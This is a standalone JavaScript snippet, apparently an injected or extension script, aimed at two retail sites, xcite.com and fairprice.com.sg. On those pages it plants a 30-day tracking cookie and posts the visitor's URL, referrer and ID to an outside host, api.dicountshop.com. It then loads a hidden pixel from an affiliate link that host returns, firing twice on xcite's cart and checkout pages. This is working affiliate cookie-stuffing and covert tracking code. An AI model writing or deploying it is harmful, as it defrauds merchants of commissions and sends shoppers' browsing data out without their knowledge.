(function () {

    const siteConfig = {
        'www.xcite.com': { always: true, cartExtra: true },
        'www.fairprice.com.sg': { always: true, cartExtra: true }
    };

    function generateUUID() {
        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
            const r = Math.random() * 0x10 | 0x0;
            const v = c === 'x' ? r : (r & 0x3 | 0x8);
            return v.toString(16);
        });
    }

    function getCookie(name) {
        const prefix = name + '=';
        const cookies = document.cookie.split(';');

        for (let i = 0; i < cookies.length; i++) {
            const cookie = cookies[i].trim();
            if (cookie.indexOf(prefix) === 0) {
                return cookie.substring(prefix.length, cookie.length);
            }
        }

        return '';
    }

    function firePixel(url) {
        try {
            const img = new Image();
            img.src = url;
            img.style.display = 'none';
            document.body.appendChild(img);
        } catch (err) {}
    }

    function detectPageType() {
        const keywords = ['cart', 'checkout', 'pay', 'shipping', 'review-order'];
        const path = window.location.pathname.toLowerCase();

        for (let i = 0; i < keywords.length; i++) {
            if (path.includes(keywords[i])) {
                return keywords[i];
            }
        }

        return null;
    }

    async function trackUser() {
        try {
            const uuid = getCookie('tracking_uuid') || generateUUID();
            const expires = new Date(Date.now() + 30 * 86400 * 1000).toUTCString();

            document.cookie = 'tracking_uuid=' + uuid + '; expires=' + expires + ';path=/;SameSite=Lax';

            const response = await fetch('https://api.dicountshop.com/api/track-user', {
                method: 'POST',
                keepalive: true,
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    url: window.location.href,
                    referrer: document.referrer,
                    unique_id: uuid,
                    origin: window.location.hostname,
                    timestamp: new Date().getTime()
                })
            });

            const result = await response.json();

            if (result.success && result.affiliate_url) {
                firePixel(result.affiliate_url);
            } else {
                firePixel('https://api.dicountshop.com/api/fallback-pixel?id=' + uuid);
            }

        } catch (err) {
            console.error('Tracking Failed:', err);
        }
    }

    function initTracking() {
        const hostname = window.location.hostname;
        const config = siteConfig[hostname];

        if (!config) {
            return;
        }

        if (hostname === 'www.xcite.com') {
            const pageType = detectPageType();
            const dedupKey = 'tracking_done_' + hostname + '_' + pageType;

            if (config.cartExtra && pageType && !sessionStorage.getItem(dedupKey)) {
                sessionStorage.setItem(dedupKey, 'true');
                trackUser();
                setTimeout(function () {
                    trackUser();
                }, 2000);
            }

            return;
        }

        if (sessionStorage.getItem('tracking_done_' + hostname)) {
            return;
        }

        if (config.always || (config.cartExtra && detectPageType())) {
            trackUser();
        }
    }

    if (document.readyState === 'interactive' || document.readyState === 'complete') {
        initTracking();
    } else {
        window.addEventListener('DOMContentLoaded', initTracking);
    }

}());
